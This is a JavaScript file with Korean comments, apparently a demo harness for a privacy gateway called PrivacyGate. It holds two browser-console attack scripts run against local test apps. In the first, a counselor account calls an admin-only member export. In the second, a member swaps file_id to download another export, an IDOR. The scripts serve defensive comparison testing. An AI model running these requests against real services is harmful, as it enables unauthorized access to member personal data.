/* PrivacyGate 최종 비교 시연 — 브라우저 개발자도구(Console)에 붙여 넣는 "동일 요청" 코드.
 * baseline·enforce 두 모드에서 글자 하나 바꾸지 않고 같은 코드를 실행한다.
 * 실행 결과는 pg-evidence-<시나리오>-<모드>.json 으로 내려받아지고, collect-evidence.sh 가 증거 폴더로 옮긴다.
 * 토큰·쿠키·비밀번호는 기록하지 않는다 (CSRF 값도 저장하지 않음).
 */

/* ───────── 공격 ① : 직원 화면(https://localhost:8080, Funnel 배포면 https://<이름>.<tailnet>.ts.net:8080)에 counselor_a 로 로그인한 탭에서 ─────────
 * 상담 직원이 총관리자 전용 "전체 회원 내보내기"를 호출하고, 성공하면 그 파일을 중계에 등록한다.
 * 3회 연속 시도 → enforce 에서는 Wazuh 반복 거부 경보(100112) 조건이 된다. */
(async (repeat = 3) => {
  const json = r => r.json().catch(() => null);
  const save = (name, obj) => { const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob([JSON.stringify(obj, null, 2)], {type: 'application/json'}));
    a.download = name; a.click(); };
  const me = await json(await fetch('/api/me', {credentials: 'same-origin'}));
  const headers = {'Content-Type': 'application/json', 'X-CSRF-Token': me.csrf_token};
  const out = {scenario: 'attack1', gate_mode: me.gate_mode, actor: me.pseudo_id, role: me.role,
               started_at: new Date().toISOString(), attempts: []};
  for (let i = 0; i < repeat; i++) {
    if (i) await new Promise(ok => setTimeout(ok, 3500));   // 요청 간격: Wazuh 반복 탐지(100112)가 순차 입력에서 안정적으로 동작
    const r = await fetch('/api/admin/member-exports', {method: 'POST', headers, credentials: 'same-origin', body: '{}'});
    const a = {request: 'POST /api/admin/member-exports', status: r.status, trace_id: r.headers.get('X-Trace-Id'), body: await json(r)};
    if (r.status === 201) {
      const t = await fetch(`/api/member-exports/${a.body.export_id}/transfer-files`, {method: 'POST', headers, credentials: 'same-origin', body: '{}'});
      a.transfer = {request: 'POST /api/member-exports/{export_id}/transfer-files', status: t.status,
                    trace_id: t.headers.get('X-Trace-Id'), body: await json(t)};
    }
    out.attempts.push(a);
  }
  save(`pg-evidence-attack1-${me.gate_mode}.json`, out);
  console.table(out.attempts.map(a => ({status: a.status, trace_id: a.trace_id, rows: a.body?.row_count, file_id: a.transfer?.body?.file_id})));
  const fid = out.attempts.find(a => a.transfer?.body?.file_id)?.transfer.body.file_id;
  console.log(fid ? `공격 ② 에 쓸 file_id: ${fid}` : '등록된 파일 없음 (enforce 에서는 정상) — 공격 ② 에는 baseline 때 받은 file_id 를 그대로 쓰세요.');
})();


/* ───────── 공격 ② : 회원 화면(https://localhost:8090, Funnel 배포면 외부 PC 에서 https://<이름>.<tailnet>.ts.net)에 승인 자료를 받은 회원(member_001)으로 로그인한 탭에서 ─────────
 * 내 승인 자료(delivery)는 그대로 두고, 다운로드 요청의 file_id 만 공격 ① 에서 만든 파일로 바꾼다.
 * 먼저 정상 다운로드(대조군)를 한 번 하고, 이어서 바꾼 요청을 보낸다. 아래 FILE_ID 만 채워서 실행. */
(async (FILE_ID = 'baseline 공격 ① 에서 출력된 file_id') => {
  const save = (name, blob) => { const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = name; a.click(); };
  const hex = async buf => [...new Uint8Array(await crypto.subtle.digest('SHA-256', buf))].map(b => b.toString(16).padStart(2, '0')).join('');
  const me = await (await fetch('/api/me', {credentials: 'same-origin'})).json();
  const list = await (await fetch('/api/me/deliveries', {credentials: 'same-origin'})).json();
  const d = list.items.find(x => x.request_status === 'approved');
  if (!d) return console.error('승인된 제공 자료가 없습니다. 사전 준비(승인 자료 1건)를 먼저 하세요.');
  const call = async (label, url) => {
    const r = await fetch(url, {credentials: 'same-origin'});
    const buf = await r.arrayBuffer(); const text = new TextDecoder().decode(buf);
    const csv = (r.headers.get('content-type') || '').includes('csv');
    return {label, request: 'GET ' + url.replace(d.delivery_id, '{delivery_id}'), status: r.status,
            trace_id: r.headers.get('X-Trace-Id'), content_type: r.headers.get('content-type'), bytes: buf.byteLength,
            sha256: r.ok ? await hex(buf) : null,
            csv_rows: r.ok && csv ? text.trim().split('\n').length - 1 : null,
            csv_header: r.ok && csv ? text.split('\n')[0] : null,
            error: r.ok ? null : (() => { try { return JSON.parse(text).error; } catch { return text.slice(0, 200); } })(),
            _body: r.ok ? new Blob([buf], {type: r.headers.get('content-type') || 'application/octet-stream'}) : null};
  };
  const control = await call('정상 다운로드(대조군)', `/api/me/deliveries/${d.delivery_id}/download`);
  const attack = await call('file_id 바꿔치기', `/api/me/deliveries/${d.delivery_id}/download?file_id=${encodeURIComponent(FILE_ID)}`);
  const strip = ({_body, ...x}) => x;
  const out = {scenario: 'attack2', gate_mode: me.gate_mode, approved_file_id: d.file_id, requested_file_id: FILE_ID,
               started_at: new Date().toISOString(), control: strip(control), attack: strip(attack)};
  save(`pg-evidence-attack2-${me.gate_mode}.json`, new Blob([JSON.stringify(out, null, 2)], {type: 'application/json'}));
  if (attack._body) save(`pg-evidence-attack2-${me.gate_mode}-received.${attack.csv_rows !== null ? 'csv' : 'json'}`, attack._body);
  console.table([strip(control), strip(attack)].map(x => ({label: x.label, status: x.status, type: x.content_type, rows: x.csv_rows, bytes: x.bytes})));
})();
